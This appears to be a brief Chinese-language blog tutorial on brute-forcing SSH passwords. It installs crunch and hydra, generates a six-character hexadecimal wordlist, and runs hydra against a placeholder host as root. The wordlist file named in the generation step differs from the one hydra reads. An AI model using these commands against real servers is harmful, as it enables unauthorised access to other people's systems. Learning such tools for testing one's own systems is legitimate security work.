---
title: 简单暴力破解SSH密码
tags: 技术
---

# 暴力破解ssh密码

# 工具
1. crunch(password generator)
	密码生成器，原理很简单，直接dfs遍历所有可能的组合即可
```shell
# debian
apt install crunch
# mac
brew install crunch
```


2. hydra(brute force credentials)
	暴力破解工具
```shell
# debian
apt install hydra
# mac
brew install hydra
```

# 开始实验

1. 生产随机密码
```shell
# crunch <min-len> <max-len> [<charset string>]
#         最小长度	最大长度	密码所包含的字符
crunch 6 6 0123456789abcdef -o 6chars.txt
```
2. 开始破解尝试破解ssh
```shell
# -l username 用户名
# -t thread 线程数
hydra -l root -P passwords.txt -t 6 ssh://ip(x.x.x.x)
```
